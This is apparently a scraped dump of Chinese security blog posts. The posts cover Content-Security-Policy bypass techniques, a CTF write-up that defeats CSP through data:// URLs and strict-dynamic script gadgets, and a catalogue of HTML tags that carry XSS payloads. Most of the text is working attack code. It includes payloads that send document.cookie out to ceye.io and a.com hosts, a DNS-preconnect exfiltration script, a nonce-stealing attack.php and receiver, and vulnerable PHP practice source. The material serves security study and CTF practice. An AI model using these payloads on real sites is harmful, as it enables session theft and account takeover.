但是有个问题，要是远程加载JS文件是不满足CSP规则的。这里我们换个源就知道了： 1xss=f=document.createElement(&quot;script&quot;);f.src=&quot;http://127.0.0.1:8000/a.js&quot;;document.body.appendChild(f); 显示拒绝加载了，因为CSP中有一条default-src ‘self’的规则限制了。 这里可以通过iframe引入外部js，将src设置为同域的，从而绕过CSP的default-src ‘self’规则。 123456789f=document.createElement(\"iframe\");f.id=\"pwn\";f.src=\"./test.txt\";f.onload=()=&gt;&#123; x=document.createElement('script'); x.src='//127.0.0.1:8000/a.js'; pwn.contentWindow.document.body.appendChild(x)&#125;;document.body.appendChild(f); 没有问题，成功引入外部js弹框： 当然也能把浏览器的数据带出来，引用外部新的c.js： 1window.open(&apos;//xxx.ceye.io/?&apos;+escape(document.cookie)) 输入： 1xss=f=document.createElement(%22iframe%22);f.id=%22pwn%22;f.src=%22./test.txt%22;f.onload=()=%3E&#123;x=document.createElement(%27script%27);x.src=%27//192.168.17.148:81/c.js%27;pwn.contentWindow.document.body.appendChild(x)&#125;;document.body.appendChild(f); 这里没有出现网上博客说的带不回的问题。 下面也可以尝试使用DNS通道来传递cookie。 123456789dc = document.cookie;dcl = dc.split(\";\");m = document.getElementsByTagName(\"HEAD\")[0];for (var i=0; i&lt;dcl.length;i++)&#123;console.log(dcl[i]);m.innerHTML = m.innerHTML + \"&lt;link rel=\\\"preconnect\\\" href=\\\"//\" + escape(dcl[i].replace(/\\//g, \"-\")).replace(/%/g, \"_\") + '.' + location.hostname.split(\".\").join(\"\") + \".xxx.ceye.io\\\"&gt;\";console.log(m.innerHTML);&#125; 在URL栏输入的时候记得进行URL编码，然后就可以看到打到cookie了： 除此之外，我们还可以获取页面中父窗口标签的内容，在php代码中加上id为secret的标签内容，注意标签必须放在获取URL参数的script标签之上，否则会报错找不到： 12345678910111213&lt;?php header(&quot;Content-Security-Policy: default-src &apos;self&apos; &apos;unsafe-inline&apos;; sandbox allow-forms allow-same-origin allow-scripts allow-modals allow-popups; &quot;); setcookie(&apos;milk&apos;,&apos;tea&apos;);?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;CSP Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;code id=&apos;secret&apos;&gt;P4ssw0rd&lt;/code&gt; &lt;script&gt;&lt;?php echo $_GET[&apos;xss&apos;];?&gt;&lt;/script&gt;&lt;/body&gt; 改下第一行的内容获取id为secret的父窗口标签即可： 123456789dc = top.document.getElementById(\"secret\").innerHTML;dcl = dc.split(\";\");m = document.getElementsByTagName(\"HEAD\")[0];for (var i=0; i&lt;dcl.length;i++)&#123;console.log(dcl[i]);m.innerHTML = m.innerHTML + \"&lt;link rel=\\\"preconnect\\\" href=\\\"//\" + escape(dcl[i].replace(/\\//g, \"-\")).replace(/%/g, \"_\") + '.' + location.hostname.split(\".\").join(\"\") + \".xxx.ceye.io\\\"&gt;\";console.log(m.innerHTML);&#125; 直接打到父窗口标签内容： 情景2——开启X-Frame-Options:DENY 如果header中添加了X-Frame-Options:DENY，则不能如此直接地利用前面的exp。 这里换个示例：http://hsts.pro/csp.php 访问，默认弹框显示welcome，可以看到站点是开了X-Frame-Options:DENY的： 查看页面源码，可以看到和之前的是差不多的，在xss参数中获取URL输入然后嵌入script标签中，其中还含有id为secret的标签： 123456789&lt;html&gt;&lt;head&gt;&lt;link rel=\"stylesheet\" href=\"/css/bootstrap.min.css\" integrity=\"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\"&gt;&lt;link rel=\"stylesheet\" href=\"/css/bootstrap-theme.min.css\" integrity=\"sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp\"&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=\"center-block\"&gt;&lt;h1&gt;Hello!&lt;/h1&gt;&lt;script&gt;alert(\"Welcome\")&lt;/script&gt;&lt;code id='secret'&gt;Secret: iGWmT7P2YlYNytnE&lt;/code&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 这里可使用CSP的第二个常见错误，即在返回Web扫描程序错误时没有提供保护性头部。若要验证这一点，最简单方法是尝试打开并不存在的网页。因为许多资源只为含有200代码的响应提供了X-Frame-Options头部，而没有为包含404代码的响应提供相应的头部。 为了强制NGINX返回“400 bad request”，你唯一需要做的，就是使用/../访问其上一级路径中的资源。为防止浏览器对请求进行规范化处理，导致/../被/所替换，对于中间的两个点号和最后一个斜线，我们可以使用unicode码来表示。 123frame=document.createElement(\"iframe\");frame.src=\"/%2e%2e%2f\";document.body.appendChild(frame); 直接在控制台插入即可，当然也可以通过xss参数输入： 上payload获取父窗口标签内容： 12345678910frame=document.createElement(\"iframe\");frame.src=\"/%2e%2e%2f\";document.body.appendChild(frame);frame.id=\"pwn\";frame.onload=()=&gt;&#123; x=document.createElement('script'); x.src='data:,alert(\"Pwned \"+top.secret.textContent)'; pwn.contentWindow.document.body.appendChild(x)&#125;;document.body.appendChild(frame); 当然，也可以访问不存在的页面，造成404错误，注意会弹两次框： 12345678910frame=document.createElement(\"iframe\");frame.src=\"/noexist.txt\";document.body.appendChild(frame);frame.id=\"pwn\";frame.onload=()=&gt;&#123; x=document.createElement('script'); x.src='data:,alert(\"Pwned \"+top.secret.textContent)'; pwn.contentWindow.document.body.appendChild(x)&#125;;document.body.appendChild(frame); 第二种让Web服务器返回错误的方法是让URL超过所允许的长度。 例如NGINX和Apache等Web服务器的默认URL长度通常被设置为不超过8kB。 123456789frame=document.createElement(\"iframe\");frame.src=\"/\"+\"A\".repeat(20000);frame.id=\"pwn\";frame.onload=()=&gt;&#123; x=document.createElement('script'); x.src='data:,alert(\"Pwned \"+top.secret.textContent)'; pwn.contentWindow.document.body.appendChild(x)&#125;;document.body.appendChild(frame); 第三种欺骗服务器返回错误的方法是触发cookie长度限制。 这是因为当前浏览器支持的cookie越来越长，已经超出了Web服务器所能处理的范围。 1、创建一个巨型的 cookie 1for(var i=0;i&lt;5;i++)&#123;document.cookie=i+”=”+”a”.repeat(4000)&#125;; 2、使用任何地址打开iframe，都会导致服务器返回错误（通常没有XFO或CSP） 3、删除巨型cookie： 1for(var i=0;i&lt;5;i++)&#123;document.cookie=i+”=”&#125; 4、将自己的js脚本写入frame中，用以窃取其父frame中的秘密信息。 payload： 1234567891011for(var i=0;i&lt;5;i++)&#123;document.cookie=i+\"=\"+\"a\".repeat(4000)&#125;;f=document.createElement(\"iframe\");f.id=\"pwn\";f.src=\"/\";f.onload=()=&gt;&#123; for(var i=0;i&lt;5;i++)&#123;document.cookie=i+\"=\"&#125;; x=document.createElement('script'); x.src='data:,alert(\"Pwned \"+top.secret.textContent)'; pwn.contentWindow.document.body.appendChild(x)&#125;;document.body.appendChild(f); 8、利用meta绕过CSP noncemeta标签有一些不常用的功能有时候有奇效： meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce： 1&lt;meta http-equiv=\"cache-control\" content=\"public\"&gt; meta可以设置Cookie（Firefox下），可以结合self-xss利用： 1&lt;meta http-equiv=\"Set-Cookie\" Content=\"cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 9、利用浏览器缓存绕过script nonce整个原理过程以Demo为例，看图吧： csp-test.php，开启了nonce script规则，并且有XSS点： 1234567891011121314151617&lt;?phpfunction random_string( $length = 8 ) &#123; $chars = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos;; $password = &apos;&apos;; for($i = 0; $i &lt; $length; $i++) &#123; $password .= $chars[ mt_rand(0, strlen($chars) - 1) ]; &#125; return $password; &#125; $random = random_string(12);header(&apos;Content-Security-Policy: default-src \\&apos;none\\&apos;; script-src \\&apos;nonce-&apos;.$random .&apos;\\&apos;;&apos;);header(&apos;Cache-Control: max-age=99999999&apos;);setcookie(&apos;milk&apos;,&apos;tea&apos;);?&gt;&lt;script nonce=&apos;&lt;?php echo $random;?&gt;&apos;&gt;document.write(&apos;URL &apos; + unescape(location.href))&lt;/script&gt;&lt;script nonce=&apos;&lt;?php echo $random;?&gt;&apos;&gt;console.log(&apos;another nonced script&apos;)&lt;/script&gt; 然后我们需要利用iframe引入这个页面，并对其发起请求获取页面内容，这里我们通过向其中注入一个&lt;textarea&gt;标签来吃掉后面的script标签，这样就可以获取内容。 attack.php： 12345678910111213141516171819202122232425262728&lt;iframe id=&quot;frame&quot; src=&quot;http://127.0.0.1/csp-test.php#&lt;form method=&apos;post&apos; action=&apos;http://127.0.0.1/nonce_receiver.php&apos;&gt;&lt;input type=&apos;submit&apos; value=&apos;test!&apos;&gt;&lt;textarea name=&apos;nonce&apos;&gt;&quot;&gt;&lt;/iframe&gt;&lt;script&gt; function getNonce() &#123; var xhr = new XMLHttpRequest(); xhr.open(&quot;GET&quot;, &quot;nonce_receiver.php&quot;, false); xhr.send(); return xhr.responseText; &#125; setTimeout(pollNonce, 1000); function pollNonce() &#123; var nonce = getNonce(); if (nonce == &quot;&quot;) &#123; setTimeout(pollNonce, 1000); &#125; else &#123; attack(nonce); &#125; &#125; function attack(nonce) &#123; var iframe = document.createElement(&quot;iframe&quot;); var url = &quot;http://127.0.0.1/csp-test.php#&quot; var payload = &quot;&lt;script nonce=&apos;&quot; + nonce + &quot;&apos;&gt;alert(document.cookie)&lt;/scr&quot; + &quot;ipt&gt;&quot; var validationPayload = &quot;&lt;script&gt;alert(&apos;If you see this alert, CSP is not active&apos;)&lt;/scr&quot; + &quot;ipt&gt;&quot; iframe.src = url + payload + validationPayload; document.body.appendChild(iframe); &#125;&lt;/script&gt; 然后我们需要一个页面去获取nonce字符串，为了反复获得，这里需要开启session。 nonce_receiver.php： 123456789101112&lt;?phpsession_start();if(!empty($_POST))&#123; $message = $_POST['nonce']; preg_match('/(nonce=\\')\\w+\\'/', $message, $matches); $nonce_number = substr($matches[0], 7, -1); $_SESSION['nonce'] = $nonce_number; echo $nonce_number;&#125;else if(!empty($_SESSION['nonce']))&#123; echo $_SESSION['nonce'];&#125;?&gt; 一切就绪了，唯一的问题就是在nonce script上，由于csp开启的问题，我们没办法自动实现自动提交，也就是攻击者必须要使按钮被点击，才能实现一次攻击。 可以看到csp-test.php中的cookie被带回来了： 10、利用wave文件绕过script-src ‘self’具体参考使用 Wave 文件绕过 CSP 策略。 0x04 参考CSP策略及绕过方法 通过iframe标签绕过csp CSP学习和绕过","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"XSS","slug":"XSS","permalink":"https://www.mi1k7ea.com/tags/XSS/"}]},{"title":"一道绕过CSP的XSS题目","date":"2019-02-21T14:12:05.000Z","path":"2019/02/21/一道绕过CSP的XSS题目/","text":"之前CTF做的一道需要绕过CSP的XSS题目，具体的代码没记下来，这里写个类似的来复现。 题目分析这里由于是本地写的类似程序，目标为弹框显示“1”即可。 访问目标站点，如下图所示，看到提示输入URL： 啥也不输入，点击Go，发现URL栏多了name参数和url参数： 查看源码，发现查看不到页面上显示的“Mi1k7ea”，推测应该是动态插入DOM生成的吧，右键查看元素，看到如下结构： 其中在header头和最后各包含一段JS代码，其中的script标签都含有nonce属性，推测应该是采用了CSP策略，多次访问nonce属性值都不一样，即是随机生成的。中间是URL栏中name参数的插入点，插入到id为”yourname”的a标签中显示到页面中。 这里可以看到，header头的JS代码是对DOM的动态操作，$(document).read即页面加载完执行；最后的JS代码为处理URL和创建Node，然后被前面的JS动态插入DOM节点中。 既然涉及到了CSP，抓包看看它设置的策略吧： 其CSP设置如下： Content-Security-Policy: default-src ‘none’; script-src ‘nonce-96a80ac6288a465630f4e631bf2f192e’ ‘strict-dynamic’; base-uri ‘self’; style-src ‘self’; font-src ‘self’ 关键点应该是前两个，即default-src ‘none’;和script-src ‘nonce-xx’ ‘strict-dynamic’; 因为前面header头的JS是动态添加DOM节点的，推测应该和strict-dynamic这个相关，可参考black hat 2017关于script gadgets绕过CSP。 XSS payload注入从前面的题目分析可知，页面的输入点有两处，即GET方式的name参数和url参数。 其中name参数是输入到id为”yourname”的a标签中，尝试对其进行XSS测试，发现会直接返回输入的内容，即已经实体编码了，利用点应该不在这： 另一个参数url，可通过input栏输入提交，尝试输入标签内容，发现提示输入内容为非法URL： 那就输入一个外部URL地址如本博客，发现提示只能输入服务端本身的URL，即应该限定了只能输入访问本地的URL，并且限制了只能是协议://ip:port这种形式才能正常执行： 本地有个test.txt文件可以访问，输入该文件地址，可以查看到页面将文件内容直接输出到pre标签中，这里可以推测，后台应该是调用file_get_content()来获取目标URL内容的： 那么问题来了，限制了只能通过协议://ip:port这种形式来作为开头输入，并且限定只能是服务端的IP，那不就没法注入XSS payload了？ 当时卡在这里卡了很久，后面发现，这是PHP的题目，是不是可以利用PHP伪协议？要想输入的内容能显现在页面中，能与之相关联的伪协议即data://伪协议。 测试一下，在输入框输入： 12data://127.0.0.1/;base64,PGltZz4=其中PGltZz4=为&lt;img&gt;的base64编码结果 检查元素可以看到，img标签成功插入到页面中显示出来。 接下来直接插入script标签尝试弹框： 12data://127.0.0.1/;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==为&lt;script&gt;alert(1)&lt;/script&gt;的base64编码结果 发现标签是插进去了，但是没有弹框，意料之中，我们的script标签没有nonce值，被CSP策略拦截不可执行了： CSP绕过关于CSP绕过，这里主要有两种方式。主要参考自CSP策略及绕过方法。 利用浏览器补全功能绕过由前面知道，我们的script标签由于没有nonce，而CSP中设置的其中一条 script-src ‘nonce-xx’ ‘strict-dynamic’; 限定了有随机nonce值或由有nonce的标签动态生成的script才能执行。 这里关注前面的script-src ‘nonce-xx’，我们想一下，是不是可以劫持某个script标签的nonce属性呢？ 在参考的文章中说到： 也就是说，利用浏览器补全的功能，在含有nonce的script标签前面的插入点插入script标签的同时，插入a=”以闭合后面script标签的第一个属性的双引号，从而使中间的内容失效，将本来的nonce属性劫持到了插入的script标签中，使得该插入标签可以正常执行JS代码，也就是说浏览器会给我们自动补全只有一个双引号的属性的值。 我们回过头来看看页面代码布局，可以看到在插入的标签后面在一段拥有nonce属性的script标签，就是它了： 构造payload：我们需要先闭合掉前面的pre和form标签，然后再插入script标签；在script标签中，先写入包含远程恶意js代码文件的src属性，再添加a=”。即 12将 &lt;/pre&gt;&lt;/form&gt;&lt;script src=&quot;http://192.168.248.1/a.js&quot; a=&quot; Base64加密即可data://127.0.0.1/;base64,PC9wcmU+PC9mb3JtPjxzY3JpcHQgc3JjPSJodHRwOi8vMTkyLjE2OC4yNDguMS9hLmpzIiBhPSI= 直接输入payload访问： 成功弹框，没有问题。 再看一下页面元素： 这里再解释一遍，把pre和form标签闭合之后，输入&lt;script src=xxx a=&quot;的内容，由于浏览器的补全功能，a标签的双引号会和最后的script标签的第一个元素即type的双引号闭合掉，从而使中间的内容即第一个红框内的内容无效，导致后面的内容自己成为新的属性，包括nonce属性，从而成功劫持了最后的script标签的nonce属性为插入的script属性，最终成功执行。 但是上述的a标签在Chrome上是执行不了的，原因在于Chrome对于标签的解析方式则不同，Chrome中解析script标签的优先级高于解析属性双引号内的值，因而前面双引号闭合的时候没法正常使其失效。但是这里可以使用src属性替代，使其可在Chrome下正常执行。 利用strict-dynamic结合gadget绕过这里探讨第二种方法。 前面知道，CSP设置了strict-dynamic，结合查阅的Black Hat 2017的文章可知，我们可以在页面上找一个可以动态生成DOM节点的JS Gadget，然后通过某些方式来劫持其中的DOM节点元素，从而使动态生成的标签可以继承该Gadget的nonce直接执行JS代码。 我们再分析一遍源码： 由之前的分析知道，最后的script标签中是处理URL和创建节点，然后再被head处的JS动态插入到DOM节点中。DOM元素id即为全局变量。我们注意到最后的script标签的JS代码中定义了一个全局变量i，而i在head处的JS代码中被动态添加到id为forminput的标签中（即绿框框中的div标签），并且当i.name不为空时，将i.name的值设置到id为yourname的标签中（即绿框框中的a标签）。这里看到，div标签在a标签前面，也就是说，我们可以通过闭合使最后的JS代码失效，从而可以劫持i，再通过i来创建新标签来劫持yourname；最后看到蓝框，params[“name”]可以通过创建一个新的标签，其分别有两个属性，id属性值为params，name属性值为要执行的JS代码，接着将id为yourname的标签设置为script标签即可（因为蓝框中的代码就是将id为params的标签的name属性值放入id为yourname的标签中，进而实现将恶意Js代码放入script标签中）。由strict-dynamic知，head的JS代码动态创建的JS是受信任的，因此该动态创建的script标签可以执行恶意JS代码。 构造payload：先闭合掉pre和form标签，至于最后面的script可以通过在最后输入&lt;script&gt;来使其失效；id为yourname的标签为script标签，但该标签没有name属性、需要多输入一个包含name属性且id为params的标签；因此，劫持i的标签需可以内嵌多个标签。 1&lt;/pre&gt;&lt;/form&gt;&lt;div id=\"i\"&gt;&lt;script id=\"yourname\"&gt;&lt;/script&gt;&lt;a id=\"params\" name=\"alert(1)\" /&gt;&gt;&lt;/div&gt;&lt;script&gt; 当然div标签可以换成span、form等，textarea标签可换成input、textarea、button、iframe、object等标签，效果一样。 Base64编码后添加到data://伪协议后面构造最终payload： 1data://127.0.0.1/plain;base64,PC9wcmU+PC9mb3JtPjxkaXYgaWQ9ImkiPjxzY3JpcHQgaWQ9InlvdXJuYW1lIj48L3NjcmlwdD48YSBpZD0icGFyYW1zIiBuYW1lPSJhbGVydCgxKSIgLz4+PC9kaXY+PHNjcmlwdD4= 直接输入运行，弹框了： 查看元素，看到箭头处输入的script标签将后面的JS代码闭合失效了，而在红框id为forminput的div标签内，动态创建了id为i的div标签，该标签内含有一个id为yourname的script标签和id为params、name为恶意JS代码的a标签： 至此，我们成功利用strict-dynamic结合gadget来绕过CSP实现XSS弹框了。 能够弹框，就肯定能够执行其他XSS payload了，如返回cookie的payload如下： 123&lt;/pre&gt;&lt;/form&gt;&lt;div id=&quot;i&quot;&gt;&lt;script id=&quot;yourname&quot;&gt;&lt;/script&gt;&lt;a id=&quot;params&quot; name=&quot;window.open(&apos;//a.com/?&apos;+escape(document.cookie))&quot; /&gt;&gt;&lt;/div&gt;&lt;script&gt;或&lt;/pre&gt;&lt;/form&gt;&lt;div id=&quot;i&quot;&gt;&lt;script id=&quot;yourname&quot;&gt;&lt;/script&gt;&lt;a id=&quot;params&quot; name=&quot;window.location.href=&apos;http://a.com/?cookie=&apos;+document.cookie&quot; /&gt;&gt;&lt;/div&gt;&lt;script&gt; 模仿写的源码以下为模仿写的代码，仅供参考练习。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?php$this_host = $_SERVER['HTTP_HOST'];setcookie('flag', 'xxctf&#123;Mi1k7ea&#125;');$nonce = md5(openssl_random_pseudo_bytes(16));header(\"Content-Security-Policy: default-src 'none'; script-src 'nonce-$nonce' 'strict-dynamic'; base-uri 'self'; style-src 'self'; font-src 'self'\");?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;CSP Test&lt;/title&gt; &lt;script type=\"text/javascript\" src=\"/static/jquery-3.3.1.js\" nonce=&lt;?php echo $nonce;?&gt;&gt;&lt;/script&gt; &lt;script type=\"text/javascript\" nonce=&lt;?php echo $nonce;?&gt;&gt; $(document).ready(function()&#123; $(\"#forminput\").append(i); if (location.search.indexOf(\"name=\") != -1) &#123; $(\"#yourname\").text(params[\"name\"]) &#125;; &#125;) &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=\"csp.php\" method=\"get\"&gt; &lt;div id=\"forminput\"&gt; &lt;input type=\"text\" name=\"name\" value=\"Mi1k7ea\" hidden=\"true\"&gt; &lt;button type=\"submit\"&gt;Go&lt;/button&gt; &lt;/div&gt; &lt;h3&gt;Hi, &lt;a id=\"yourname\"&gt;&lt;/a&gt; :)&lt;/h3&gt; &lt;?php if (isset($_GET['url'])) &#123; $x = @$_GET['url']; if (filter_var($x, FILTER_VALIDATE_URL)) &#123; $r = parse_url($x); if (isset($r['port'])) &#123; $r['host'] = $r['host'].\":\".$r['port']; &#125; if (preg_match(\"/&#123;$this_host&#125;$/i\", $r['host'])) &#123; $a = file_get_contents($x); echo (\"Result: &lt;pre&gt;\".$a.\"&lt;/pre&gt;\"); &#125; else &#123; echo \"&lt;script nonce=&#123;$nonce&#125;&gt;alert('You can only input &#123;$this_host&#125;')&lt;/script&gt;\"; &#125; &#125; else &#123; echo \"Invaild URL!\"; &#125; &#125; ?&gt;&lt;/form&gt;&lt;script type=\"text/javascript\" nonce=&lt;?php echo $nonce;?&gt;&gt; url_param = new URL(location.href).searchParams params = &#123;&#125; for(value of url_param.keys())&#123; params[value] = url_param.get(value); &#125; var i = document.createElement(\"input\"); i.name = \"url\"; i.type = \"text\"; if (location.search.indexOf(\"post=\") != -1) &#123; i.value = params[\"post\"]; &#125;else&#123; i.placeholder = \"input url...\"; &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"XSS","slug":"XSS","permalink":"https://www.mi1k7ea.com/tags/XSS/"}]},{"title":"一些加载XSS Payload的标签","date":"2019-02-19T14:54:12.000Z","path":"2019/02/19/一些加载XSS-Payload的标签/","text":"之前整理的一些可以加载XSS Payload的标签，后面还会继续更新。 script标签这个标签不用多说。 123456789&lt;script&gt;alert(1)&lt;/script&gt;&lt;script src=\"http://127.0.0.1/a.js\"&gt;&lt;/script&gt;&lt;script&gt;eval(\"\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029\")&lt;/script&gt;&lt;script&gt;eval(\"\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29\")&lt;/script&gt;&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;&lt;script&gt;var x=eval;x(alert(1));&lt;/script&gt;&lt;script&gt;(1, 2, eval)(alert(1))&lt;/script&gt;&lt;script&gt;eval.call(null, 'alert(1)')&lt;/script&gt;&lt;script&gt;Mi1k7ea();function Mi1k7ea()&#123;alert(1);&#125;&lt;/script&gt; a标签其实，利用到javascript伪协议的payload，可以不用添加引号。 123456&lt;a href=javascript:alert(1)&gt;Mi1k7ea&lt;/a&gt;&lt;a href=javascript:confirm(1)&gt;Mi1k7ea&lt;/a&gt;&lt;a href=# onclick=alert(1)&gt;Mi1k7ea&lt;/a&gt;&lt;a href=# onmouseover=alert(1)&gt;Mi1k7ea&lt;/a&gt;&lt;a href=# onmouseout=alert(1)&gt;Mi1k7ea&lt;/a&gt;//其他onmouse系列... img标签通常是触发onerror事件来执行js代码，当然也有其他事件可触发。 12345678910&lt;img src=x onerror=alert(1)&gt;&lt;img src=\"pain.jpg\" onload=alert(1)&gt;&lt;img src=x onerror=alert(1)&gt;&lt;img src=x onclick=alert(1)&gt;&lt;img src=\"pain.jpg\" onmouseout=alert(1)&gt;//其他onmouse系列...&lt;img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://127.0.0.1/a.js';&gt;//alert被过滤&lt;img src=x onerror=document.body.appendChild(document.createElement(\"scr\"+\"ipt\")).src=\"http://127.0.0.1/a.js\"&gt;&lt;img src=x onerror=eval(\"\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29\")&gt;&lt;img src=x onerror=eval(\"&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;\")&gt; body标签主要可利用onload、onpageshow等事件属性 1234&lt;body onload=alert(1)&gt;&lt;body/onload=alert(1)&gt;&lt;body onpageshow=alert(1)&gt;&lt;body/onpageshow=alert(1)&gt; svg标签svg标签可以和onload组合进行利用： 1234&lt;svg onload=alert(1)&gt;&lt;svg/onload=alert(1)&gt;&lt;svg onload=document.body.appendChild(document.createElement(\"scr\"+\"ipt\")).src=\"http://127.0.0.1/a.js\"&gt;&lt;svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt; form标签form标签需要结合其中支持的标签和input标签才能成功触发。 123456789//onmouse系列&lt;form onmouseout=alert(1)&gt; &lt;input type=\"text\"&gt;&lt;/form&gt;//利用action&lt;form action=javascript:alert(1)&gt; &lt;input type=\"submit\"&gt;&lt;/form&gt; input标签1234567891011121314&lt;input onclick=alert(1)&gt;//支持onmouse系列&lt;input onmouseout=alert(1)&gt;//改变输入框内容时触发&lt;input type=\"text\" onchange=alert(1)&gt;//结合form标签使用formaction属性&lt;form&gt;&lt;input type=\"submit\" formaction=\"javascript:alert(1)\"&gt;&lt;/form&gt;&lt;form&gt;&lt;input type=\"image\" formaction=\"javascript:alert(1)\"&gt;&lt;/form&gt;//通过Alt+Shift+自定义的字符（这里为M）触发，仅Firefox测试ok&lt;input type=\"hidden\" accesskey=\"M\" onclick=alert(1)&gt; style标签style标签可以和onload组合进行利用： 1&lt;style onload=alert(1) /&gt; iframe标签主要利用src属性来构造。 123456789&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;&lt;iframe onmouseout=alert(1)&gt;&lt;/iframe&gt;//其他onmouse系列...//base64加密内容为&lt;script&gt;alert(1)&lt;/script&gt;&lt;iframe width=\"0px\" height=\"0px\" src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\" /&gt;//base64加密内容为&lt;script src=\"http://127.0.0.1/a.js\"&gt;&lt;/script&gt;&lt;iframe width=\"0px\" height=\"0px\" src=\"data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly8xMjcuMC4wLjEvYS5qcyI+PC9zY3JpcHQ+\" /&gt;&lt;iframe src=\"javascript&amp;colon;alert&amp;lpar;1&amp;rpar;\" /&gt;&lt;iframe src=\"data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;\" /&gt;//谷歌可弹 object标签利用data伪协议。 1234//base64加密内容为&lt;script&gt;alert(1)&lt;/script&gt;&lt;object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\" /&gt;//base64加密内容为&lt;script src=\"http://127.0.0.1/a.js\"&gt;&lt;/script&gt;&lt;object data=\"data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly8xMjcuMC4wLjEvYS5qcyI+PC9zY3JpcHQ+\" /&gt; span标签通过Alt+Shift+自定义的字符（这里为M）触发，仅Firefox测试ok。 1&lt;span accesskey=\"M\" onclick=alert(1)&gt;&lt;/span&gt; marquee标签Marquee 标签除了在web开发中有标签内容回滚作用之外，它还支持一系列的事件处理程序，因此可以用它来实现XSS Payload触发。Marquee支持的一系列事件处理程序如下： onbounce事件：是在marquee标签中的内容滚动到上下或左右边界时触发的事件处理程序，该事件只有在marquee标签的behavior属性设为alternate时才有效； onfinish事件：当 marquee 完成 loop 属性设置的值时触发。它只能在 loop 属性设置为大于 0 的某个数字时触发； onstart事件: 当 marquee 标签内容开始滚动时触发。 123&lt;marquee behavior=\"alternate\" onstart=alert(1)&gt;Mi1k7ea&lt;/marquee&gt;&lt;marquee loop=\"1\" onfinish=alert(1)&gt;Mi1k7ea&lt;/marquee&gt;&lt;marquee onstart=alert(1)&gt;Mi1k7ea&lt;/marquee&gt; Media类型标签Media类型标签的src属性加上javascript伪协议并不能触发XSS Payload。 audio标签和video标签的以下属性可用于触发payload。 oncanplay: 在用户可以开始播放音视频（audio/video）时触发； ondurationchange: 在音视频（audio/video）的时长发生变化时触发； onended: 在音视频（audio/video）播放结束时触发； onloadeddata: 在音视频数据帧加载时触发，也即在当前帧的数据加载完成且还没有足够的数据播放音视频（audio/video）的下一帧时触发； onloadedmetadata: 在指定音视频（audio/video）的元数据（如分辨率和时长）加载后触发； onloadstart: 在浏览器开始寻找指定音视频（audio/video）时触发； onprogress: 浏览器下载指定的音视频（audio/video）时触发； onsuspend: 在浏览器读取音视频（audio/video）数据中止时触发。 12345678910111213141516171819202122//audio标签，对应MP3文件&lt;audio oncanplay=\"alert(1)\" src=\"test.mp3\" /&gt;&lt;audio ondurationchange=\"alert(1)\" src=\"test.mp3\" /&gt;&lt;audio autoplay=\"true\" onended=\"alert(1)\" src=\"test.mp3\" /&gt;&lt;audio onloadeddata=\"alert(1)\" src=\"test.mp3\" /&gt;&lt;audio onloadedmetadata=\"alert(1)\" src=\"test.mp3\" /&gt;&lt;audio onloadstart=\"alert(1)\" src=\"test.mp3\" /&gt;&lt;audio onprogress=\"alert(1)\" src=\"test.mp3\" /&gt;&lt;audio onsuspend=\"alert(1)\" src=\"test.mp3\" /&gt;&lt;audio src=x onerror=javascript:alert(1) /&gt;//video标签，对应MP4文件&lt;video oncanplay=\"alert(1)\" src=\"test.mp4\" /&gt;&lt;video ondurationchange=\"alert(1)\" src=\"test.mp4\" /&gt;&lt;video autoplay=\"true\" onended=\"alert(1)\" src=\"test.mp4\" /&gt;&lt;video onloadeddata=\"alert(1)\" src=\"test.mp4\" /&gt;&lt;video onloadedmetadata=\"alert(1)\" src=\"test.mp4\" /&gt;&lt;video onloadstart=\"alert(1)\" src=\"test.mp4\" /&gt;&lt;video onprogress=\"alert(1)\" src=\"test.mp4\" /&gt;&lt;video onsuspend=\"alert(1)\" src=\"test.mp4\" /&gt;&lt;video src=x onerror=javascript:alert(1) /&gt;&lt;video src=\"test.mp4\" onclick=alert(1) /&gt; 参考他山之石 | 对 XSS 的一次深入分析认识 xss其他标签下的js用法总结大全","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"XSS","slug":"XSS","permalink":"https://www.mi1k7ea.com/tags/XSS/"}]},{"title":"个人XSS payload收集","date":"2019-02-16T07:58:11.000Z","path":"2019/02/16/个人XSS-payload收集/","text":"这里为个人网上收集的XSS Payload，仅用于XSS攻击测试。 